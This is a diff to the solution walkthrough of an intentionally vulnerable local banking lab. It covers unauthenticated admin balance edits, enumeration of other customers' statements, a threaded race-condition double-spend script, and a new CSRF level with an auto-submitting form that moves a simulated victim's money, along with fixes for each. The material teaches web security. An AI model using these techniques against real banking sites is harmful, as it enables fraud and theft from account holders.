@@ -11,9 +11,10 @@
    - or brute-force directories: `gobuster dir -u http://127.0.0.1:5000 -w /usr/share/wordlists/dirb/common.txt`
 3. Open `/admin-panel`. It works even when you're logged out.
 4. Use "Manual balance adjustment" to credit your user with at least $1,900.
-   With curl (the first registered user after a reset gets id 5):
+   With curl (the first registered user after a reset gets id 6; accounts 1-5 are seeded -
+   see the "Seed accounts" section of the README):
    ```bash
-   curl -X POST http://127.0.0.1:5000/admin-panel/adjust -d user_id=5 -d amount=1900
+   curl -X POST http://127.0.0.1:5000/admin-panel/adjust -d user_id=6 -d amount=1900
    ```
 5. Reload your dashboard to see the flag.
 
@@ -26,10 +27,11 @@ for every admin route. Return 404 instead of 403 if you also want to hide that t
 `/account/<id>/statement` takes the account id from the URL and never checks that it
 belongs to the logged-in user.
 
-1. Register and log in. Your dashboard shows "Checking account #5".
-2. Click "Full statement". The URL is `/account/5/statement`.
+1. Register and log in. Your dashboard shows "Checking account #6".
+2. Click "Full statement". The URL is `/account/6/statement`.
 3. Change the number. Accounts 1-3 are admin, alice and bob. Account 4 is
-   "Richard Vance (VIP)" with $1.25M.
+   "Richard Vance (VIP)" with $1.25M. Account 5 (`nora`) is just another customer here -
+   she matters in a later level.
 4. His statement has a memo `Safe deposit box #7 rental, code: L2P{...}`. That's the flag.
 
 Enumerating with Burp Intruder or ffuf (copy your `session` cookie from the browser):
@@ -119,23 +121,28 @@ is credited in full for each one that gets through, so money is created from not
 1. Register two accounts: `me` (keeps its $100) and `mule` (where the money piles up).
    Log in as `me` and grab its session cookie (e.g. from devtools, or a `requests.Session`).
 2. Fire several transfers of $100 from `me` to `mule` **at the same time**, not one after
-   another - that's the whole trick. With Python:
+   another - that's the whole trick. Every mode except `csrf` requires the hidden
+   `csrf_token` field from the dashboard's transfer form, so grab that once and reuse it
+   for every request (it's tied to your session, not single-use):
    ```python
-   import requests, threading
+   import re, requests, threading
    s = requests.Session()
    s.post("http://127.0.0.1:5000/login", data={"username": "me", "password": "secret1"})
+   token = re.search(r'name="csrf_token" value="([^"]+)"', s.get("http://127.0.0.1:5000/dashboard").text)[1]
 
    def send():
-       s.post("http://127.0.0.1:5000/transfer", data={"to": "mule", "amount": "100"})
+       s.post("http://127.0.0.1:5000/transfer", data={"to": "mule", "amount": "100", "csrf_token": token})
 
    threads = [threading.Thread(target=send) for _ in range(6)]
    [t.start() for t in threads]
    [t.join() for t in threads]
    ```
-   Or with curl, launched in the background so they overlap:
+   Or with curl, launched in the background so they overlap (fetch the token the same way
+   from a logged-in `curl -c cookies.txt` request to `/dashboard` first):
    ```bash
    for i in 1 2 3 4 5 6; do
-     curl -s -b cookies.txt -X POST http://127.0.0.1:5000/transfer -d to=mule -d amount=100 &
+     curl -s -b cookies.txt -X POST http://127.0.0.1:5000/transfer \
+       -d to=mule -d amount=100 -d csrf_token="$TOKEN" &
    done; wait
    ```
 3. `me`'s balance check passes for every request (each sees the original $100 before any
@@ -154,3 +161,60 @@ If no row matches (balance was already too low by the time this runs), `rowcount
 the transfer is rejected - there's no window between checking and spending for a second
 request to sneak into. The same pattern (a conditional, single-statement update) is the
 standard fix for this whole class of bug in any relational database.
+
+## csrf - Level 6
+
+**Vulnerability:** `/transfer` never checks a CSRF token in this mode (every other mode
+does). A form hosted on *any* site can POST to it, and the browser will automatically
+attach the victim's session cookie, because cookies are sent based on which site the
+*request* targets, not which site served the page making it. The server can't tell that
+request apart from one the victim meant to submit herself.
+
+1. Register your own account (so you have a username to receive the stolen money) and open
+   the **CSRF Lab** page from the nav bar. It shows Nora Kessler's balance ($3,000 to start)
+   - you can watch it change as you attack her.
+2. Copy the starter PoC shown on that page into a file named `exploit.html`. Change
+   `YOUR_USERNAME_HERE` to your own username. It's a form that auto-submits itself on load:
+   ```html
+   <form id="csrf-form" action="http://127.0.0.1:5000/transfer" method="POST">
+     <input type="hidden" name="to" value="YOUR_USERNAME_HERE">
+     <input type="hidden" name="amount" value="1000">
+     <input type="hidden" name="memo" value="gift">
+   </form>
+   <script>document.getElementById("csrf-form").submit();</script>
+   ```
+   Notice what's missing: no `csrf_token` field, because you have no way to read one out of
+   Nora's session from a different origin. That's exactly the bug this mode leaves open.
+3. Host it on a **different port**, so it's genuinely a different origin from the bank
+   (this is the same thing as hosting it on a different domain entirely in the real world):
+   ```bash
+   python3 -m http.server 8000
+   ```
+4. Back in the CSRF Lab page, paste `http://127.0.0.1:8000/exploit.html` and click
+   **Deliver to victim**. This runs a small bot that logs in as Nora for real over HTTP
+   (simulating her browser already being logged in), fetches your page, and submits
+   whatever form it finds there - carrying her session cookie, exactly like a real browser
+   would if she'd opened your link.
+5. The report shows the bot's HTTP requests and Nora's new balance. Reload your own
+   dashboard: once your balance passes $1,000 (your starting $100 plus her stolen $1,000),
+   the flag appears.
+
+A real attack wouldn't need a lab button - you'd just get the victim to open the page (a
+link in an email, an ad, a forum post with an `<img>`-sized iframe). The bot here stands in
+for that click, using a real second HTTP session so the whole chain - login, page fetch,
+forged submission - genuinely happens, nothing is faked.
+
+**Why this needs a dedicated CSRF token (not just checking the `Referer`/`Origin` header,
+and not just relying on cookies):** modern browsers send `SameSite=Lax` cookies by default,
+which already blocks a lot of basic cross-site POST forgery - this lab models the
+underlying logic flaw (no server-side proof the request came from your own site) that
+`SameSite` alone doesn't fully close (subdomains, misconfigured cookies, and older or
+embedded browsers can still be exposed). Defense in depth still wants a real token.
+
+**Fix (see `secure` mode):** generate a random, per-session token, embed it as a hidden
+field in every state-changing form, and reject the request if the submitted token doesn't
+match the one tied to the user's session (`app.py`'s `get_csrf_token()` /
+`session.get("csrf_token")` check in `transfer()`). An attacker's page can forge the
+request's other fields, but can't read your session to put the right token in it. Real
+apps usually get this via a framework (e.g. Flask-WTF's `CSRFProtect`) rather than
+hand-rolling it.
